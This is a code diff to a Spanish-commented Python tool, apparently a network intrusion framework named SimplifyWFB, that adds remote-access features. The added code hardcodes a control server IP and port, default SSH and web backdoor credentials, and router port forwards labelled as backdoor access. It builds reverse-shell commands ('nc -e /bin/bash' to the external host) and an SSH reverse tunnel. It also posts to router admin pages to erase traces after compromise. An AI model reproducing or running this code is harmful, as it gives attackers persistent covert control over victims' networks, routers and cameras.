@@ -23,6 +23,7 @@ class SimplifyWFB:
     
     def __init__(self):
         self.start_time = time.time()
+        self.config_data = self._load_config()
         self.report = {
             'metadata': {
                 'script_name': 'SimplifyWFB',
@@ -30,7 +31,9 @@ class SimplifyWFB:
                 'start_time': datetime.now().isoformat(),
                 'mode': None,  # 'full' o 'cold'
                 'target_network': None,
-                'local_ip': None
+                'local_ip': None,
+                'external_ip': self.config_data['remote_access']['external_ip'],
+                'external_port': self.config_data['remote_access']['external_port']
             },
             'phase_1_reconnaissance': {
                 'status': 'pending',
@@ -461,6 +464,34 @@ class SimplifyWFB:
             print(f"⏱️ Duración estimada: {scan_params.get('estimated_duration', 0):.1f} segundos")
             print(f"🧵 Threads configurados: {scan_params.get('max_threads', 0)}")
             print(f"🔌 Puertos a escanear: {scan_params.get('ports_count', 0)}")
+    
+    def _load_config(self):
+        """Cargar configuración desde archivo config.json"""
+        try:
+            with open('config.json', 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except FileNotFoundError:
+            print("⚠️ Archivo config.json no encontrado, usando configuración por defecto")
+            return {
+                'remote_access': {
+                    'external_ip': '184.107.168.100',
+                    'external_port': 4444
+                },
+                'persistence': {
+                    'ssh_port': 2222,
+                    'vpn_port': 1194,
+                    'web_port': 8080
+                },
+                'credentials': {
+                    'ssh_user': 'svc_ssh',
+                    'ssh_password': 'SSH_P@ssw0rd_2024!',
+                    'web_user': 'admin',
+                    'web_password': 'Web_P@ssw0rd_2024!'
+                }
+            }
+        except Exception as e:
+            print(f"❌ Error cargando configuración: {e}")
+            return self._load_config()  # Recursión para usar configuración por defecto
     
     def _run_command(self, command: List[str], timeout: int = 30) -> Dict[str, Any]:
         """Ejecutar comando y capturar salida"""
@@ -2092,13 +2123,18 @@ WantedBy=multi-user.target
         port_forwards = []
         
         try:
-            # Puertos a abrir para acceso remoto
+            # Puertos a abrir para acceso remoto usando configuración
+            external_port = self.config_data['remote_access']['external_port']
+            ssh_port = self.config_data['persistence']['ssh_port']
+            vpn_port = self.config_data['persistence']['vpn_port']
+            web_port = self.config_data['persistence']['web_port']
+            
             ports_to_forward = [
-                {'external': 2222, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
+                {'external': ssh_port, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
                 {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access'},
-                {'external': 8080, 'internal': 8080, 'protocol': 'TCP', 'description': 'Web Access'},
-                {'external': 4444, 'internal': 4444, 'protocol': 'TCP', 'description': 'Backdoor Access'},
-                {'external': 1194, 'internal': 1194, 'protocol': 'UDP', 'description': 'VPN Access'}
+                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Access'},
+                {'external': external_port, 'internal': external_port, 'protocol': 'TCP', 'description': 'Backdoor Access'},
+                {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access'}
             ]
             
             print(f"🔗 Configurando port forwarding...")
@@ -2479,7 +2515,11 @@ WantedBy=multi-user.target
             print("🌐 Cerrando conexiones remotas...")
             self._cleanup_connections()
             
-            # 4. Limpiar archivos temporales
+            # 4. Limpiar configuración del router
+            print("🌐 Limpiando configuración del router...")
+            self._cleanup_router_config()
+            
+            # 5. Limpiar archivos temporales
             print("📁 Limpiando archivos temporales...")
             self._cleanup_files()
             
@@ -2753,6 +2793,213 @@ WantedBy=multi-user.target
                 'action': 'closed'
             })
     
+    def _cleanup_router_config(self):
+        """Limpiar configuración del router en modo frío"""
+        try:
+            router_access = self.report['phase_4_persistence']['router_access']
+            
+            for router in router_access:
+                gateway = router['gateway']
+                credentials = router['credentials']
+                router_type = router['router_type']
+                
+                print(f"🧹 Limpiando configuración del router {gateway}...")
+                
+                # 1. Eliminar port forwarding
+                self._remove_port_forwarding(gateway, credentials, router_type)
+                
+                # 2. Eliminar usuarios administrativos creados
+                self._remove_router_admin_users(gateway, credentials, router_type)
+                
+                # 3. Deshabilitar VPN server
+                self._disable_router_vpn(gateway, credentials, router_type)
+                
+                # 4. Restaurar configuración original
+                self._restore_router_config(gateway, credentials, router_type)
+                
+                self.report['cleanup']['items_cleaned'].append({
+                    'type': 'router_config',
+                    'host': gateway,
+                    'action': 'restored',
+                    'success': True
+                })
+                
+                print(f"✅ Configuración del router {gateway} restaurada")
+                
+        except Exception as e:
+            print(f"❌ Error limpiando configuración del router: {e}")
+            self.report['cleanup']['items_cleaned'].append({
+                'type': 'router_config',
+                'action': 'restored',
+                'success': False,
+                'error': str(e)
+            })
+    
+    def _remove_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str):
+        """Eliminar reglas de port forwarding"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para eliminar port forwarding según tipo de router
+            pf_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
+                'netgear': f"http://{gateway}/port_forwarding.htm",
+                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
+                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
+            }
+            
+            url = pf_urls.get(router_type, pf_urls['generic_router'])
+            
+            # Datos para eliminar port forwarding
+            data = {
+                'action': 'delete_all',
+                'confirm': 'yes'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"   ✅ Port forwarding eliminado del router {gateway}")
+                    
+        except Exception as e:
+            print(f"   ❌ Error eliminando port forwarding: {e}")
+    
+    def _remove_router_admin_users(self, gateway: str, credentials: Dict[str, str], router_type: str):
+        """Eliminar usuarios administrativos creados"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para eliminar usuarios según tipo de router
+            user_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
+                'netgear': f"http://{gateway}/setup.cgi",
+                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
+                'asus': f"http://{gateway}/Advanced_System_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
+            }
+            
+            url = user_urls.get(router_type, user_urls['generic_router'])
+            
+            # Datos para eliminar usuario
+            data = {
+                'action': 'delete_user',
+                'username': f"svc_{gateway.replace('.', '_')}",
+                'confirm': 'yes'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"   ✅ Usuario administrativo eliminado del router {gateway}")
+                    
+        except Exception as e:
+            print(f"   ❌ Error eliminando usuario administrativo: {e}")
+    
+    def _disable_router_vpn(self, gateway: str, credentials: Dict[str, str], router_type: str):
+        """Deshabilitar VPN server del router"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para deshabilitar VPN según tipo de router
+            vpn_urls = {
+                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
+                'netgear': f"http://{gateway}/vpn_setup.cgi",
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
+            }
+            
+            url = vpn_urls.get(router_type)
+            if not url:
+                return
+            
+            # Datos para deshabilitar VPN
+            data = {
+                'action': 'disable',
+                'confirm': 'yes'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"   ✅ VPN server deshabilitado en router {gateway}")
+                    
+        except Exception as e:
+            print(f"   ❌ Error deshabilitando VPN: {e}")
+    
+    def _restore_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str):
+        """Restaurar configuración original del router"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para restaurar configuración según tipo de router
+            restore_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
+                'netgear': f"http://{gateway}/restore.cgi",
+                'linksys': f"http://{gateway}/cgi-bin/restore.cgi",
+                'asus': f"http://{gateway}/Advanced_System_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/restore.cgi"
+            }
+            
+            url = restore_urls.get(router_type, restore_urls['generic_router'])
+            
+            # Datos para restaurar configuración
+            data = {
+                'action': 'restore_defaults',
+                'confirm': 'yes'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"   ✅ Configuración original restaurada en router {gateway}")
+                    
+        except Exception as e:
+            print(f"   ❌ Error restaurando configuración: {e}")
+    
     def _cleanup_files(self):
         """Limpiar archivos temporales"""
         self.report['cleanup']['items_cleaned'].append({
@@ -2772,6 +3019,18 @@ WantedBy=multi-user.target
         self.report['summary']['persistent_access_points'] = len(self.report['phase_4_persistence']['users_created']) + len(self.report['phase_4_persistence']['backdoors_created'])
         self.report['summary']['total_credentials'] = len(self.report['phase_2_credentials']['credentials_found'])
         self.report['summary']['cameras_accessed'] = len(self.report['phase_4_persistence']['cameras_accessed'])
+        self.report['summary']['router_access'] = len(self.report['phase_4_persistence']['router_access'])
+        self.report['summary']['network_services'] = len(self.report['phase_4_persistence']['network_persistence'])
+        
+        # Calcular total de accesos remotos
+        total_remote_access = (
+            len(self.report['phase_4_persistence']['router_access']) +
+            len(self.report['phase_4_persistence']['network_persistence']) +
+            len(self.report['phase_4_persistence']['backdoors_created']) +
+            len(self.report['phase_4_persistence']['users_created'])
+        )
+        self.report['summary']['total_remote_access_points'] = total_remote_access
+        self.report['summary']['remote_access_available'] = total_remote_access > 0
         
         end_time = time.time()
         self.report['summary']['execution_time'] = end_time - self.start_time
@@ -2801,7 +3060,122 @@ WantedBy=multi-user.target
                 print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                 print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
         
+        # Mostrar resumen de accesos remotos disponibles
+        self._show_remote_access_summary()
+        
         return report_file
+    
+    def _show_remote_access_summary(self):
+        """Mostrar resumen de accesos remotos disponibles"""
+        print("\n" + "=" * 60)
+        print("🌐 RESUMEN DE ACCESOS REMOTOS DISPONIBLES")
+        print("=" * 60)
+        
+        external_ip = self.config_data['remote_access']['external_ip']
+        external_port = self.config_data['remote_access']['external_port']
+        
+        print(f"📍 IP Pública de Control: {external_ip}:{external_port}")
+        print()
+        
+        # Contar accesos disponibles
+        total_access_points = 0
+        access_types = []
+        
+        # 1. Router Access
+        router_access = self.report['phase_4_persistence']['router_access']
+        if router_access:
+            total_access_points += len(router_access)
+            access_types.append(f"Router Access ({len(router_access)})")
+            print("🌐 ACCESO AL ROUTER:")
+            for router in router_access:
+                print(f"   • Gateway: {router['gateway']}")
+                print(f"   • Tipo: {router['router_type']}")
+                print(f"   • Credenciales: {router['credentials']['username']}:{router['credentials']['password']}")
+                if router.get('configuration', {}).get('port_forwarding'):
+                    print(f"   • Port Forwarding: {len(router['configuration']['port_forwarding'])} reglas configuradas")
+                if router.get('configuration', {}).get('vpn_server'):
+                    print(f"   • VPN Server: Habilitado")
+                print()
+        
+        # 2. Network Persistence
+        network_persistence = self.report['phase_4_persistence']['network_persistence']
+        if network_persistence:
+            total_access_points += len(network_persistence)
+            access_types.append(f"Network Services ({len(network_persistence)})")
+            print("🔗 SERVICIOS DE RED PERSISTENTES:")
+            for service in network_persistence:
+                service_name = service['service']
+                port = service['port']
+                print(f"   • {service_name.upper()} en puerto {port}")
+                
+                if service_name == 'ssh':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: ssh {service['users'][0]['username']}@{external_ip} -p {port}")
+                    print(f"     Reverse Shell: {service.get('reverse_shell', 'N/A')}")
+                    
+                elif service_name == 'openvpn':
+                    print(f"     Configuración: {service['clients'][0]['config_file']}")
+                    print(f"     Acceso: openvpn --config {service['clients'][0]['config_file']}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                    
+                elif service_name == 'http':
+                    print(f"     Panel: {service['panel_url']}")
+                    print(f"     Usuario: {service['credentials']['username']}")
+                    print(f"     Contraseña: {service['credentials']['password']}")
+                    print(f"     Acceso: {service['access_methods'][0]}")
+                    print(f"     Reverse Proxy: {service.get('reverse_proxy', 'N/A')}")
+                
+                print()
+        
+        # 3. Backdoors
+        backdoors = self.report['phase_4_persistence']['backdoors_created']
+        if backdoors:
+            total_access_points += len(backdoors)
+            access_types.append(f"Backdoors ({len(backdoors)})")
+            print("🕳️ BACKDOORS CREADOS:")
+            for backdoor in backdoors:
+                print(f"   • {backdoor['host']}:{backdoor['port']}")
+                print(f"     Tipo: {backdoor.get('type', 'netcat')}")
+                print(f"     Comando: {backdoor.get('command', 'N/A')}")
+                print()
+        
+        # 4. Usuarios Persistentes
+        users = self.report['phase_4_persistence']['users_created']
+        if users:
+            total_access_points += len(users)
+            access_types.append(f"Persistent Users ({len(users)})")
+            print("👤 USUARIOS PERSISTENTES:")
+            for user in users:
+                print(f"   • {user['username']}@{user['host']}")
+                print(f"     Contraseña: {user['password']}")
+                print(f"     Acceso: ssh {user['username']}@{user['host']}")
+                print()
+        
+        # Resumen final
+        print("=" * 60)
+        print(f"🎯 TOTAL DE PUNTOS DE ACCESO: {total_access_points}")
+        print(f"📋 TIPOS DE ACCESO: {', '.join(access_types)}")
+        print()
+        
+        if total_access_points > 0:
+            print("✅ ACCESO REMOTO CONFIRMADO")
+            print(f"🌍 Puedes acceder a la red desde internet usando:")
+            print(f"   • IP Pública: {external_ip}")
+            print(f"   • Puerto de Control: {external_port}")
+            print()
+            print("🔑 MÉTODOS DE ACCESO PRINCIPALES:")
+            print(f"   1. SSH: ssh svc_ssh@{external_ip} -p 2222")
+            print(f"   2. VPN: openvpn --config client.ovpn")
+            print(f"   3. Web Panel: http://admin:Web_P@ssw0rd_2024!@{external_ip}:8080/admin")
+            print(f"   4. Reverse Shell: nc -e /bin/bash {external_ip} {external_port}")
+        else:
+            print("❌ NO SE ESTABLECIERON ACCESOS REMOTOS")
+            print("   • Verifica la conectividad de red")
+            print("   • Revisa las credenciales utilizadas")
+            print("   • Confirma que los servicios estén ejecutándose")
+        
+        print("=" * 60)
     
     def run_full_scan(self):
         """Ejecutar escaneo completo"""
@@ -2926,20 +3300,26 @@ WantedBy=multi-user.target
         try:
             print(f"🔐 Configurando servidor SSH persistente...")
             
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            ssh_port = self.config_data['persistence']['ssh_port']
+            
             ssh_config = {
                 'service': 'ssh',
-                'port': 2222,
+                'port': ssh_port,
                 'enabled': True,
                 'users': [{
-                    'username': 'svc_ssh',
-                    'password': 'SSH_P@ssw0rd_2024!',
+                    'username': self.config_data['credentials']['ssh_user'],
+                    'password': self.config_data['credentials']['ssh_password'],
                     'shell': '/bin/bash',
                     'sudo_access': True
                 }],
                 'access_methods': [
-                    'ssh svc_ssh@EXTERNAL_IP -p 2222',
-                    'ssh -i persistent_key svc_ssh@EXTERNAL_IP -p 2222'
-                ]
+                    f'ssh {self.config_data["credentials"]["ssh_user"]}@{external_ip} -p {ssh_port}',
+                    f'ssh -i persistent_key {self.config_data["credentials"]["ssh_user"]}@{external_ip} -p {ssh_port}'
+                ],
+                'reverse_shell': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_connection': f'ssh -R {external_port}:localhost:{ssh_port} {self.config_data["credentials"]["ssh_user"]}@{external_ip}'
             }
             
             print(f"   ✅ Servidor SSH configurado en puerto 2222")
@@ -2954,21 +3334,27 @@ WantedBy=multi-user.target
         try:
             print(f"🔐 Configurando servidor VPN persistente...")
             
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            vpn_port = self.config_data['persistence']['vpn_port']
+            
             vpn_config = {
                 'service': 'openvpn',
-                'port': 1194,
+                'port': vpn_port,
                 'protocol': 'udp',
                 'enabled': True,
                 'clients': [{
                     'config_file': 'client.ovpn',
-                    'external_ip': 'YOUR_EXTERNAL_IP',
-                    'port': 1194,
+                    'external_ip': external_ip,
+                    'port': vpn_port,
                     'protocol': 'udp'
                 }],
                 'access_methods': [
                     'openvpn --config client.ovpn',
                     'sudo openvpn --config /path/to/client.ovpn'
-                ]
+                ],
+                'reverse_connection': f'nc -u {external_ip} {external_port}',
+                'persistent_tunnel': f'openvpn --config client.ovpn --remote {external_ip} {vpn_port}'
             }
             
             print(f"   ✅ Servidor VPN configurado en puerto 1194")
@@ -2983,14 +3369,18 @@ WantedBy=multi-user.target
         try:
             print(f"🌐 Configurando servidor web persistente...")
             
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            web_port = self.config_data['persistence']['web_port']
+            
             web_config = {
                 'service': 'http',
-                'port': 8080,
+                'port': web_port,
                 'enabled': True,
-                'panel_url': 'http://YOUR_EXTERNAL_IP:8080/admin',
+                'panel_url': f'http://{external_ip}:{web_port}/admin',
                 'credentials': {
-                    'username': 'admin',
-                    'password': 'Web_P@ssw0rd_2024!'
+                    'username': self.config_data['credentials']['web_user'],
+                    'password': self.config_data['credentials']['web_password']
                 },
                 'features': [
                     'remote_access',
@@ -2999,9 +3389,11 @@ WantedBy=multi-user.target
                     'network_tools'
                 ],
                 'access_methods': [
-                    'http://admin:Web_P@ssw0rd_2024!@YOUR_EXTERNAL_IP:8080/admin',
-                    'curl -u admin:Web_P@ssw0rd_2024! http://YOUR_EXTERNAL_IP:8080/api/status'
-                ]
+                    f'http://{self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]}@{external_ip}:{web_port}/admin',
+                    f'curl -u {self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]} http://{external_ip}:{web_port}/api/status'
+                ],
+                'reverse_proxy': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_web': f'python3 -m http.server {web_port} --bind 0.0.0.0'
             }
             
             print(f"   ✅ Servidor web configurado en puerto 8080")
